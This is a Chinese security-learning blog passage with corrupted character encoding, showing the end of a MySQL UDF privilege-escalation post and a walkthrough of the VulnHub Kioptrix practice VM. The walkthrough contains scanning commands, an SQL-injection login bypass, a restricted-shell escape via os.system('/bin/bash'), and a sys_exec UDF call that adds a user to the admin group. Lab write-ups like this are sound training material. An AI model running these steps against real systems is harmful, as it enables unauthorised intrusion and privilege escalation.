å‡½æ•°å·²ç»å­˜åœ¨ï¼Œä½†æ— æ³•åˆ©ç”¨ å°è¯•å°†udfææƒç›¸å…³çš„åˆ©ç”¨å‡½æ•°è¿›è¡Œåˆ é™¤åé‡æ–°åˆ›å»º 3ã€åˆ›å»ºsys_eval å‡½æ•°æ—¶æç¤ºå·²ç»å­˜åœ¨ï¼Œä½†åˆ©ç”¨ä¸åˆ é™¤æ—¶æç¤º sys_eval å‡½æ•°ä¸å­˜åœ¨ï¼ˆå®æˆ˜æ— æ³•è§£å†³ï¼Œæ¼æ´å¤ç°å¯ä»¥ï¼‰ã€‚** åŸå› æ˜¯ä¸Šä¸€ä¸ªäººåˆ©ç”¨è¿‡åï¼Œæ•°æ®åº“è¿›è¡Œäº†é‡å¯ã€‚ ä¹‹åé‡å¯mysqldæœåŠ¡å™¨ï¼Œå†åˆ›å»ºå°±å¯ä»¥äº†ã€‚ 4ã€ERROR 1126 (HY000) Can't open shared library 'udf.dll' (errno: 193 ) åœ¨è¿›è¡Œudfææƒæ—¶ç¢°åˆ°è¿™ä¸ªé”™è¯¯ä¸€èˆ¬æ˜¯ufdæ–‡ä»¶ä½æ•°é€‰æ‹©é”™è¯¯ï¼Œå°è¯•å¦ä¸€ä¸ªä½æ•°çš„udfæ–‡ä»¶ã€‚ 2.8 ä¿®å¤å»ºè®® 1ã€mysqlé…ç½®æ–‡ä»¶ä¸­secure_file_privé¡¹è®¾ç½®ä¸ºNULLæˆ–é mysql/lib/pluginç›®å½•ã€‚ 2ã€æ•°æ®åº“ç”¨æˆ·ç¡®ä¿æ­£ç¡®å®æ–½æœ€å°æƒé™åŸåˆ™ã€‚ 0x03 Linux-UDFææƒ Linuxç¯å¢ƒä¸‹çš„UDFææƒå¤§æ¦‚ç‡ä»…é™äºé¶åœºç¯å¢ƒä¸­ï¼ŒåŸå› ï¼š åœ¨Linuxä¸¥æ ¼çš„ç³»ç»Ÿæƒé™ä¸‹ï¼Œmysqlç”¨æˆ·æˆ–webç”¨æˆ·æ— pluginç›®å½•çš„å†™å…¥æƒé™ã€‚ Linuxç¯å¢ƒä¸‹çš„udfææƒé™¤åˆ©ç”¨æ¡ä»¶å¤–ä¸Windowsç¯å¢ƒä¸‹å®Œå…¨ç›¸åŒã€‚ åˆ©ç”¨æ¡ä»¶ï¼šé™¤windowsç¯‡ä¸­çš„å†…å®¹å¤–ï¼Œè¿˜éœ€è¦pluginç›®å½•çš„å†™å…¥æƒé™ã€‚ å› æ­¤è¿™é‡Œæˆ‘ä¹Ÿæ‰¾æ–‡ç« å¤ç°äº†ï¼Œåªèƒ½è¯´é‡åˆ°çš„è¯åœ¨ç ”ç©¶å§ã€‚ ä¸‹æ¬¡å­¦ä¹ ä¸€ç•ªé€ƒé€¸restricted shellï¼Œä½†ä¼¼ä¹è¿™ç±»æ–‡ç« ä¸å¥½æ‰¾â”­â”®ï¹â”­â”® 0x04 å‚è€ƒæ–‡ç«  ã€æ•°æ®åº“ææƒç³»åˆ—ã€‘â€”ã€Mysql-UDFææƒç¯‡ã€‘ [mysql udfææƒ ] --webshell+udfææƒå¯ä»¥çœ‹è¿™ç¯‡","tags":["æ•°æ®åº“ææƒç³»åˆ—"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"vulnhub-kioptrix_level 1.3","path":"/2023/09/24/kioptrix-level-1.3/","content":"0x01 é¶åœºä¿¡æ¯ åœ°å€ï¼šhttps://www.vulnhub.com/entry/kioptrix-level-1-1,22/ å‘å¸ƒæ—¥æœŸï¼š2010 å¹´ 2 æœˆ 17 æ—¥ éš¾åº¦ï¼šå®¹æ˜“ ç›®æ ‡ï¼šè·å–root shell æè¿°ï¼šThis Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. Source: http://www.kioptrix.com/blog/?page_id=135 Source: http://www.kioptrix.com/blog/?p=49 ![image-20230924185658114](kioptrix_level 1.3/image-20230924185658114.png) è¿™é‡Œåœ¨æ­å»ºä¹Ÿæ˜¯è´¹ç‚¹è„‘å­ï¼Œè¿™é‡Œå¦‚ä¸Šå›¾ä¸‹è½½å¥½raråŒ…ä¹‹åå‘ç°åªæœ‰ä¸€ä¸ªvmdxçš„æ–‡ä»¶ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆåœ¨è™šæ‹Ÿæœºä¸Šåˆ›å»ºä¸€ä¸ªç©ºçš„ ![image-20230924185745215](kioptrix_level 1.3/image-20230924185745215.png) ![image-20230924185756615](kioptrix_level 1.3/image-20230924185756615.png) è¿™é‡Œé€‰æ‹©å…¶ä»–å³å¯ ![image-20230924185811593](kioptrix_level 1.3/image-20230924185811593.png) è¿™é‡Œæ”¾åœ¨åˆé€‚çš„åœ°æ–¹ï¼Œå®‰è£…å¥½åè¿›å…¥è™šæ‹Ÿæœºè®¾ç½®ä¸­ï¼Œå°†åŸå…ˆçš„ç¡¬ç›˜åˆ é™¤æ‰ï¼Œæ¢æˆæˆ‘ä»¬ä¸‹è½½å¥½çš„vmdxæ–‡ä»¶å³å¯ ![image-20230924185924521](kioptrix_level 1.3/image-20230924185924521.png) ä¸‹è½½å¥½æ‰“å¼€å³å¯ï¼Œå¯èƒ½å†æ‰“å¼€çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä»–ä¼šæç¤ºè®©æˆ‘ä»¬æ¢æˆå¦‚ä¸‹å›¾çš„é…ç½® ![image-20230924190011738](kioptrix_level 1.3/image-20230924190011738.png) æˆ‘ä»¬ç…§åšå³å¯ 0x02 ä¿¡æ¯æ”¶é›† æ¢æµ‹å­˜æ´»ä¸»æœº netdiscover -r 192.168.17.0/24 ![image-20230924191700887](kioptrix_level 1.3/image-20230924191700887.png) é‚£ç›®æ ‡æœºå°±æ˜¯192.168.17.145äº† ç«¯å£æ‰«æ nmap -sS -sV -A -p 1-65535 192.168.17.143 ![image-20230924192157892](kioptrix_level 1.3/image-20230924192157892.png) å¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸Šå››ä¸ªç«¯å£çš„å¼€å¯ï¼Œæˆ‘ä»¬å…ˆè®¿é—®80çœ‹çœ‹ ![image-20230924192223848](kioptrix_level 1.3/image-20230924192223848.png) å¦‚å›¾æ˜¯ä¸€ä¸ªç™»å½•å¹³å°ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹webç›®å½• webç›®å½•æ‰«æ dirsearch -u \"http://192.168.17.145\" -x 400-599 -t 50 Target: http://192.168.17.145/ [19:25:29] Starting: [19:25:51] 200 - 109B - /checklogin [19:25:52] 200 - 109B - /checklogin.php [19:25:54] 200 - 298B - /database.sql [19:26:00] 200 - 933B - /images/ [19:26:01] 301 - 356B - /images -&gt; http://192.168.17.145/images/ [19:26:01] 200 - 1KB - /index.php [19:26:02] 200 - 1KB - /index.php/login/ [19:26:02] 200 - 1KB - /index [19:26:05] 302 - 0B - /logout -&gt; index.php [19:26:05] 302 - 0B - /logout.php -&gt; index.php [19:26:05] 302 - 0B - /logout/ -&gt; index.php [19:26:07] 302 - 220B - /member -&gt; index.php [19:26:07] 302 - 220B - /member/login.jsp -&gt; index.php [19:26:07] 302 - 220B - /member/login.aspx -&gt; index.php [19:26:07] 302 - 220B - /member/logon -&gt; index.php [19:26:07] 302 - 220B - /member/login.rb -&gt; index.php [19:26:07] 302 - 220B - /member/login.html -&gt; index.php [19:26:07] 302 - 220B - /member/ -&gt; index.php [19:26:07] 302 - 220B - /member/login -&gt; index.php [19:26:07] 302 - 220B - /member/admin.asp -&gt; index.php [19:26:07] 302 - 220B - /member/login.py -&gt; index.php [19:26:07] 302 - 220B - /member/login.php -&gt; index.php [19:26:07] 302 - 220B - /member/login.js -&gt; index.php [19:26:07] 302 - 220B - /member.php -&gt; index.php [19:26:07] 302 - 220B - /member/signin -&gt; index.php [19:26:07] 302 - 220B - /member/login.asp -&gt; index.php æµ‹è¯•ä¸€ç•ªå‘ç°å¦‚ä¸‹ä¿¡æ¯ï¼š database.sqlï¼š CREATE TABLE `members` ( `id` int(4) NOT NULL auto_increment, `username` varchar(65) NOT NULL default '', `password` varchar(65) NOT NULL default '', PRIMARY KEY (`id`) ) TYPE=MyISAM AUTO_INCREMENT=2 ; -- -- Dumping data for table `members` -- INSERT INTO `members` VALUES (1, 'john', '1234'); ä¼°è®¡æ˜¯sqlæ³¨å…¥äº† webç½‘ç«™æŒ‡çº¹æ‰«æ whatweb http://192.168.17.145 ![image-20230924193046254](kioptrix_level 1.3/image-20230924193046254.png) æ­¤å¤„ä¼¼ä¹æ²¡ä»€ä¹ˆé‡è¦ä¿¡æ¯ï¼Œä½†å›è¿‡å¤´æ¥çœ‹äº†çœ‹sqlæ³„éœ²çš„ä¿¡æ¯ 0x03 æ¼æ´å‘ç°åŠåˆ©ç”¨ ä¸‡èƒ½å¯†ç ç™»å½•è·å–ç”¨æˆ·ä¿¡æ¯ INSERT INTO `members` VALUES (1, 'john', '1234'); æˆ‘ç¬é—´å°±è®¤ä¸ºè¿™å¯èƒ½æ˜¯ç™»å½•é¡µé¢çš„ä¿¡æ¯ï¼Œä½†è¯•äº†è¯•æ²¡å•¥ç”¨ï¼Œæ¥ç€ä¾¿æ²¡æ€è·¯äº†ï¼Œäºæ˜¯çœ‹äº†wpå‘ç°æ˜¯æˆ‘çš„dirsearchæ‰«çš„ä¸è¡Œï¼Œä½¿ç”¨kaliè‡ªå¸¦çš„dirbç«Ÿç„¶è¿˜èƒ½æ‰«åˆ°ä¸€ä¸ªjohnåç¼€çš„urlã€‚ã€‚ã€‚ã€‚è¯ä¸å¤šè¯´æˆ‘ä»¬è®¿é—®çœ‹çœ‹ ![image-20230924195229960](kioptrix_level 1.3/image-20230924195229960.png) ![image-20230924195250034](kioptrix_level 1.3/image-20230924195250034.png) ![image-20230924195507516](kioptrix_level 1.3/image-20230924195507516.png) å¥½å§æ²¡ä»€ä¹ˆåµç”¨ï¼Œæ¥ç€wpè¯´å°è¯•å¼±å£ä»¤ï¼Œä½†æˆ‘ä¹‹å‰ä¹Ÿå°è¯•äº†å´æ²¡æˆåŠŸï¼Œè¿˜æ˜¯æ€ªè‡ªå·±ç»éªŒå°‘è€Œä¸”æ²¡è€å¿ƒå§â”­â”®ï¹â”­â”® ç„¶åæˆ‘è·Ÿç€æ•™ç¨‹èµ°ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Ÿï¼Ÿï¼Ÿç»“æœæ¢ä¸€ä¸ªæµè§ˆå™¨å°±å¥½äº†ï¼ŒçœŸå®ç„å­¦ï¼Œçœ‹æ¥åˆå¤šäº†ä¸€ä¸ªç»éªŒ john 'or'1'='1 æˆ‘ä»¬è¾“å…¥å¦‚ä¸Šä¿¡æ¯ï¼Œå³å¯å¾—åˆ°ç”¨æˆ·ä¿¡æ¯ ![image-20230924200000467](kioptrix_level 1.3/image-20230924200000467.png) æ¥ä¸‹æ¥æˆ‘åˆä¸çŸ¥é“å¹²å˜›äº†ï¼Œè¦ä¸æ˜¯çœ‹wpæˆ‘åˆå¿˜äº†å¯ä»¥å°è¯•ä¸€ä¸‹sshè¿æ¥çš„ã€‚ã€‚ã€‚ ![image-20230924200233909](kioptrix_level 1.3/image-20230924200233909.png) ä½†æˆåŠŸç™»é™†ä¹‹åå¥‡æ€ªçš„æ˜¯ä»€ä¹ˆå‘½ä»¤ä¹Ÿä¸èƒ½æ‰§è¡Œã€‚ã€‚ã€‚ï¼Œä»”ç»†ä¸€çœ‹å‘ç°è¿™é‡Œä¼¼ä¹æ˜¯è‡ªå®šä¹‰äº†ä¸€äº›å‘½ä»¤ç¬¦ ![image-20230924200358200](kioptrix_level 1.3/image-20230924200358200.png) å¦‚å›¾è¾“å…¥?æˆ–è€…helpèƒ½æŸ¥çœ‹å¯ä»¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Œä¸è¿‡ è¿˜æ˜¯å¾ˆé¸¡è‚‹ï¼Œæˆ‘ç”¨éäº†ä¹Ÿä¸çŸ¥é“æœ‰å•¥æœ‰æ•ˆä¿¡æ¯ï¼Œçœ‹äº†wpå‘ç°åˆæ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼Œä»–è¿™é‡Œé‡‡ç”¨äº†ä¸€ç§ææƒæ–¹æ³•ï¼Œå…¶å®æˆ‘ä¹Ÿåº”è¯¥å¾€è¿™é‡Œæƒ³çš„ï¼Œå³ä½¿æˆ‘ä¸ä¼šï¼Œä½†å¾—æœ‰æƒ³æ³• mysql-udf ææƒ echo os.system(\"/bin/bash\") #è¾“å‡ºbashå‘½ä»¤è¡Œ cd /var/www cat checklogin.php ![image-20230924201147686](kioptrix_level 1.3/image-20230924201147686.png) å› ä¸ºèœçš„ç¼˜æ•…ï¼Œæˆ‘ä¸ç†è§£ä»–echoå‘½ä»¤çš„æ“ä½œåŸç†ï¼Œäºæ˜¯GPTé—®äº†ä¸€ç•ªï¼Œæœç„¶AIå°±æ˜¯å¥½ï¼Œç™¾åº¦æ²¡æ‰¾åˆ°çš„ï¼Œæˆ‘ä¸€ä¸‹å­å°±é€å½»äº† è¿™è¡Œä»£ç çœ‹èµ·æ¥æ˜¯ç”¨Pythonçš„`os.system`å‡½æ•°åœ¨Linuxç³»ç»Ÿä¸­æ‰§è¡Œäº†ä¸€ä¸ªå‘½ä»¤`/bin/bash`ã€‚è®©æˆ‘æ¥è§£é‡Šä¸€ä¸‹ï¼š 1. `echo`: è¿™æ˜¯ä¸€ä¸ªLinuxå‘½ä»¤ï¼Œç”¨äºåœ¨ç»ˆç«¯ä¸­æ‰“å°æ–‡æœ¬ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¢«ç”¨ä½œä¸€ä¸ªå¤–éƒ¨å‘½ä»¤ï¼Œä¼šæ‰“å°`os.system(\"/bin/bash\")`è¿™ä¸ªå­—ç¬¦ä¸²åˆ°ç»ˆç«¯ã€‚ 2. `os.system(\"/bin/bash\")`: è¿™éƒ¨åˆ†æ˜¯Pythonä»£ç ï¼Œå®ƒè°ƒç”¨äº†`os.system`å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨äºåœ¨æ“ä½œç³»ç»Ÿä¸­æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ã€‚åœ¨è¿™é‡Œï¼Œä¼ é€’ç»™`os.system`å‡½æ•°çš„å‚æ•°æ˜¯`\"/bin/bash\"`ï¼Œè¿™æ˜¯ä¸€ä¸ªLinuxç³»ç»Ÿä¸­çš„å‘½ä»¤è§£é‡Šå™¨ï¼Œä¹Ÿå°±æ˜¯Bash Shellã€‚ ç»¼åˆèµ·æ¥ï¼Œè¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯åœ¨Linuxç³»ç»Ÿä¸­æ‰“å°å­—ç¬¦ä¸²`os.system(\"/bin/bash\")`åˆ°ç»ˆç«¯ï¼Œå¹¶å°è¯•æ‰§è¡Œ`/bin/bash`ï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨ä¸€ä¸ªæ–°çš„Bash Shellè¿›ç¨‹ã€‚è¿™æ ·ï¼Œå¦‚æœè¿è¡Œè¿™æ®µä»£ç ï¼Œä½ å°†ä¼šçœ‹åˆ°è¯¥å­—ç¬¦ä¸²è¢«æ‰“å°åˆ°ç»ˆç«¯ï¼Œå¹¶ä¸”ä½ ä¼šè¿›å…¥ä¸€ä¸ªæ–°çš„Bash Shellï¼Œå¯ä»¥åœ¨å…¶ä¸­æ‰§è¡Œå…¶ä»–å‘½ä»¤å’Œæ“ä½œã€‚è¯·æ³¨æ„ï¼Œæ‰§è¡Œè¿™æ®µä»£ç éœ€è¦è¶³å¤Ÿçš„æƒé™ï¼Œå› ä¸ºå®ƒå°è¯•å¯åŠ¨ä¸€ä¸ªæ–°çš„Shellã€‚è¿™ç§ä»£ç ä½¿ç”¨å¾—å½“ï¼Œå¯ä»¥ç”¨äºè°ƒç”¨å…¶ä»–ç³»ç»Ÿå‘½ä»¤ï¼Œä½†ä¹Ÿéœ€è¦å°å¿ƒï¼Œä»¥å…æ»¥ç”¨æˆ–é€ æˆå®‰å…¨é—®é¢˜ã€‚ ä»¥ä¸Šä¸ºGPTå›ç­”ï¼Œæ€»çš„æ¥è¯´ï¼Œechoå‘½ä»¤è¡Œè°ƒç”¨äº†systemå‘½ä»¤æ¥æ‰§è¡Œ/bin/bashï¼Œäºæ˜¯å¯åŠ¨äº†ä¸€ä¸ªæ–°çš„shellè¿›ç¨‹ï¼Œæ°å¥½å¯åŠ¨ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨æ›´å¤šçš„linuxç³»ç»Ÿå‘½ä»¤äº†â€”ç†è§£æ­¢æ­¥äºæ­¤ï¼Œè¯·ä½¬ä»¬å˜´ä¸‹ç•™æƒ…â”­â”®ï¹â”­â”® è¿™é‡Œ è·Ÿç€æ­¥éª¤çœ‹ä¸€ä¸ªcheckæºç  &lt;?php ob_start(); $host=\"localhost\"; // Host name $username=\"root\"; // Mysql username $password=\"\"; // Mysql password $db_name=\"members\"; // Database name $tbl_name=\"members\"; // Table name // Connect to server and select databse. mysql_connect(\"$host\", \"$username\", \"$password\")or die(\"cannot connect\"); mysql_select_db(\"$db_name\")or die(\"cannot select DB\"); // Define $myusername and $mypassword $myusername=$_POST['myusername']; $mypassword=$_POST['mypassword']; // To protect MySQL injection (more detail about MySQL injection) $myusername = stripslashes($myusername); //$mypassword = stripslashes($mypassword); $myusername = mysql_real_escape_string($myusername); //$mypassword = mysql_real_escape_string($mypassword); //$sql=\"SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'\"; $result=mysql_query(\"SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'\"); //$result=mysql_query($sql); // Mysql_num_row is counting table row $count=mysql_num_rows($result); // If result matched $myusername and $mypassword, table row must be 1 row if($count!=0){ // Register $myusername, $mypassword and redirect to file \"login_success.php\" session_register(\"myusername\"); session_register(\"mypassword\"); header(\"location:login_success.php?username=$myusername\"); } else { echo \"Wrong Username or Password\"; print('&lt;form method=\"link\" action=\"index.php\"&gt;&lt;input type=submit value=\"Try Again\"&gt;&lt;/form&gt;'); } ob_end_flush(); ?&gt; å¯ä»¥çœ‹åˆ°ä¸Šè¿°ä»£ç åªå¯¹usernameåšäº†å‚æ•°è¿‡æ»¤ï¼Œå¹¶æ²¡æœ‰é™åˆ¶passwordï¼Œè¿™ä¹Ÿæ˜¯ä¸‡èƒ½å¯†ç æˆåŠŸçš„åŸå› ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°æ•°æ®åº“é…ç½®ä¿¡æ¯ï¼Œçœ‹äº†wpï¼Œå‘ç°æ¥ä¸‹æ¥å°±å¯ä»¥æƒ³åˆ°mysqlæ•°æ®åº“ææƒäº† ç”±äºä¸ç†Ÿæ‚‰mysqlå‘½ä»¤ï¼Œå°±cvè¿‡æ¥äº† ![image-20230924202012411](kioptrix_level 1.3/image-20230924202012411.png) è¿™é‡Œç™»å½•çš„æ—¶å€™å¯†ç é»˜è®¤ä¸ºç©ºï¼Œæ¥ä¸‹æ¥ä½¬åˆæ¯«æ— ç†ç”±çš„è¾“å…¥äº†ä¸€ä¸‹å‘½ä»¤ï¼Œâ”­â”®ï¹â”­â”® mysql -uroot -p select sys_exec(\"usermod -aG admin john\"); exit ä»¥ä¸‹æ˜¯GPT å›ç­” select: è¿™æ˜¯ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥çš„èµ·å§‹éƒ¨åˆ†ï¼Œè¡¨ç¤ºä½ è¦æ‰§è¡Œä¸€ä¸ªæŸ¥è¯¢æ“ä½œã€‚é€šå¸¸ï¼Œselect ç”¨äºä»æ•°æ®åº“ä¸­æ£€ç´¢æ•°æ®ã€‚ sys_exec(\"usermod -aG admin john\"): è¿™æ˜¯ä¸€ä¸ª SQL æŸ¥è¯¢ä¸­çš„å‡½æ•°è°ƒç”¨ï¼Œå…¶ä¸­è°ƒç”¨äº†ä¸€ä¸ªåä¸º sys_exec çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶ä¼ é€’äº†ä¸€ä¸ªå‚æ•° \"usermod -aG admin john\" ç»™è¯¥å‡½æ•°ã€‚æ ¹æ®å‡½æ•°åå’Œå‚æ•°çš„å½¢å¼ï¼Œå¯ä»¥æ¨æ–­å‡ºè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ \"usermod -aG admin john\" æ˜¯ä¸€ä¸ª Linux ç³»ç»Ÿå‘½ä»¤ï¼Œç”¨äºå°†ç”¨æˆ· john æ·»åŠ åˆ° admin ç”¨æˆ·ç»„ã€‚è¿™ä¸ªå‘½ä»¤é€šå¸¸ç”¨äºç®¡ç†ç”¨æˆ·å’Œç”¨æˆ·ç»„çš„æƒé™ã€‚ å¦‚æœä½ çš„æ•°æ®åº“æ”¯æŒå¹¶é…ç½®äº† sys_exec å‡½æ•°ï¼Œå¹¶ä¸”å…·æœ‰è¶³å¤Ÿçš„æƒé™æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™ä¸ª SQL æŸ¥è¯¢å°†å°è¯•æ‰§è¡Œ usermod -aG admin john å‘½ä»¤ï¼Œå°†ç”¨æˆ· john æ·»åŠ åˆ° admin ç”¨æˆ·ç»„ä¸­ã€‚ æˆ‘ä»¬å‘ç°æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤ä¾¿å¯ä»¥å°†johnåŠ å…¥åˆ°adminç”¨æˆ·ç»„äº† ![image-20230924202337538](kioptrix_level 1.3/image-20230924202337538.png) é¡ºä¾¿è§£é‡Šä¸€ä¸‹ä¸Šè¿°å‘½ä»¤å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼Œæˆ‘ä¹Ÿå¤ä¹ å¤ä¹ ï¼ŒGPTå›ç­”ï¼š å½“è§£é‡Šå‘½ä»¤ `usermod -aG admin john` æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ†è§£å’Œè§£é‡Šå„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š 1. `usermod`: è¿™æ˜¯ä¸€ä¸ª Linux å‘½ä»¤ï¼Œç”¨äºä¿®æ”¹ç”¨æˆ·å¸æˆ·çš„å±æ€§ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ç®¡ç†ç”¨æˆ·å¸æˆ·çš„å±æ€§ï¼Œä¾‹å¦‚æ›´æ”¹ç”¨æˆ·åã€å¯†ç ã€å®¶ç›®å½•ç­‰ã€‚ 2. `-aG`: è¿™æ˜¯ `usermod` å‘½ä»¤çš„é€‰é¡¹å’Œå‚æ•°ï¼Œå…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š - `-a`: è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºè¿½åŠ ï¼ˆappendï¼‰ã€‚å½“ä¸ `-G` é€‰é¡¹ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå®ƒæŒ‡ç¤ºå°†ç”¨æˆ·æ·»åŠ åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªé™„åŠ çš„ç”¨æˆ·ç»„ä¸­ï¼Œè€Œä¸ä¼šå°†å…¶ä»å…¶ä»–ç»„ä¸­åˆ é™¤ã€‚å¦‚æœçœç•¥äº† `-a` é€‰é¡¹ï¼Œç”¨æˆ·å°†è¢«ä»å…¶ä»–ç»„ä¸­ç§»é™¤ï¼Œå¹¶ä¸”åªä¼šå±äºæ–°æŒ‡å®šçš„ç»„ã€‚ - `-G admin`: è¿™ä¸ªéƒ¨åˆ†è¡¨ç¤ºå°†ç”¨æˆ·æ·»åŠ åˆ°åä¸º `admin` çš„ç”¨æˆ·ç»„ä¸­ã€‚åœ¨ Linux ä¸­ï¼Œç”¨æˆ·å¯ä»¥åŒæ—¶å±äºä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·ç»„ã€‚è¿™ä¸ªå‘½ä»¤å°†ç”¨æˆ· `john` æ·»åŠ åˆ° `admin` ç”¨æˆ·ç»„ï¼Œè¿™å¯èƒ½ç”¨äºæˆäºˆç”¨æˆ· `john` æŸäº›ç®¡ç†å‘˜æƒé™æˆ–è®¿é—®æŸäº›ç³»ç»Ÿèµ„æºçš„æƒé™ã€‚ 3. `john`: è¿™æ˜¯è¦ä¿®æ”¹çš„ç”¨æˆ·çš„ç”¨æˆ·åã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`usermod` å‘½ä»¤å°†å¯¹ç”¨æˆ·åä¸º `john` çš„ç”¨æˆ·æ‰§è¡Œæ“ä½œã€‚ ç»¼åˆèµ·æ¥ï¼Œè¿™ä¸ªå‘½ä»¤çš„å«ä¹‰æ˜¯å°†ç”¨æˆ· `john` æ·»åŠ åˆ° `admin` ç”¨æˆ·ç»„ï¼Œè€Œä¸ä¼šä»ä»»ä½•å…¶ä»–ç»„ä¸­åˆ é™¤ä»–ã€‚è¿™é€šå¸¸ç”¨äºç®¡ç†ç”¨æˆ·çš„æƒé™ï¼Œä»¥ä¾¿ä»–å¯ä»¥è®¿é—® `admin` ç»„çš„èµ„æºæˆ–æ‰§è¡Œéœ€è¦ `admin` ç»„æƒé™çš„æ“ä½œï¼Œè€Œä¸å½±å“å…¶åœ¨å…¶ä»–ç»„çš„æˆå‘˜èµ„æ ¼ã€‚ æ‰¾åˆ°flag sudo su root å¯†ç ï¼šMyNameIsJohn cd ~ cat congrats.txt ![image-20230924202451357](kioptrix_level 1.3/image-20230924202451357.png) 0x04 é¶åœºæ€»ç»“ é¶åœºechoå‘½ä»¤æ¢ç´¢ æœ¬ç€å¯¹çŸ¥è¯†çš„æ¸´æœ›ä¸å¯¹è‡ªå·±å­¦ä¹ çš„è´Ÿè´£ï¼Œæˆ‘ç»§ç»­æœå¯»äº†ä¸Šè¿°echo os.system(\"/bin/bash\")çš„å«ä¹‰ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œæˆ‘å‘ç°åœ¨æ­¤æ¬¡é¶åœºç¯å¢ƒä¸­ï¼Œä¹‹æ‰€ä»¥å½“å‰ç”¨æˆ·ä½¿ç”¨çš„å‘½ä»¤æå…¶æœ‰é™ï¼Œæ˜¯å› ä¸ºä»–å¤„äºä¸€ä¸ªlshellçš„ç¯å¢ƒï¼Œçœ‹è¿™æ„æ€åº”è¯¥æ˜¯limit shell å¯¹å…¶ç®€å•çš„ä»‹ç»ï¼š Linuxå—é™shellè½¯ä»¶lshellé™åˆ¶ç”¨æˆ·è¡Œä¸ºï¼š æœ‰æ—¶æˆ‘ä»¬éœ€è¦é™åˆ¶ç™»å½•åˆ°Linuxç³»ç»Ÿç”¨æˆ·çš„è¡Œä¸ºï¼Œæœ€ç®€å•çš„åŠæ³•è«è¿‡äºé™åˆ¶å…¶æ‰€èƒ½æ‰§è¡Œçš„å‘½ä»¤ã€‚ Lshellæ˜¯å¦ä¸€æ¬¾å¯ä»¥å®ç°è¿™ä¸ªåŠŸèƒ½çš„è½¯ä»¶ï¼Œæ˜¯ç”±Pythonç¼–å†™ã€‚ æ¥ç€æœäº†åŠå¤©å¦‚ä½•\"çªç ´å—é™åˆ¶çš„shellç¯å¢ƒ\"å‘ç°éƒ½æ²¡æœ‰åŒ…å«ä¸Šè¿°æ–¹æ³•ï¼Œä¹Ÿå°±æ”¾å¼ƒäº†ï¼Œåªéœ€å°†æ­¤æ–¹æ³•è®°ä½å§ã€‚ niktoæ¼æ‰«åˆè¯† åœ¨è¿™é‡Œæˆ‘å‘ç°æœ‰ç¯‡æ–‡ç« ç”¨çš„æ˜¯niktoæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ²¡æ¥è§¦è¿‡ï¼Œäºæ˜¯ç®€å•äº†è§£äº†ä¸€ä¸‹ Niktoæ˜¯ä¸€ä¸ªå¼€æºçš„WEBæ‰«æè¯„ä¼°è½¯ä»¶ï¼Œå¯ä»¥å¯¹WebæœåŠ¡å™¨è¿›è¡Œå¤šé¡¹å®‰å…¨æµ‹è¯•ï¼Œèƒ½åœ¨230å¤šç§æœåŠ¡å™¨ä¸Šæ‰«æå‡º 2600å¤šç§æœ‰æ½œåœ¨å±é™©çš„æ–‡ä»¶ã€CGIåŠå…¶ä»–é—®é¢˜ã€‚Niktoä½¿ç”¨Perlè¯­è¨€ç¼–å†™è¿è¡Œï¼ŒNiktoå¯ä»¥æ‰«ææŒ‡å®šä¸»æœºçš„WEBç±»å‹ã€ä¸»æœºåã€æŒ‡å®šç›®å½•ã€ç‰¹å®šCGIæ¼æ´ã€è¿”å›ä¸»æœºå…è®¸çš„ httpæ¨¡å¼ç­‰. å…·ä½“å¯ä»¥å‚è€ƒï¼šWebæ¼æ´æ‰«æç¥å™¨Niktoä½¿ç”¨æŒ‡å— Kali-æ‰«æå·¥å…·-Niktoä½¿ç”¨ SMB æšä¸¾ è¿™é‡Œåˆå‘ç°ä¸€ä¸ªæ–°å§¿åŠ¿ æ ¹æ®ç«¯å£ä¿¡æ¯å‘ç°å­˜åœ¨ SMB æœåŠ¡ï¼Œä½¿ç”¨ enum4linux å¯¹å…¶è¿›è¡Œæšä¸¾ï¼šenum4linux 192.168.17.145 ![image-20230924210740235](kioptrix_level 1.3/image-20230924210740235.png) å¾ˆç¥å¥‡ï¼Œç›´æ¥å‘ç°äº†ä¸‰ä¸ªç”¨æˆ· æœªè·å–åˆ° smb 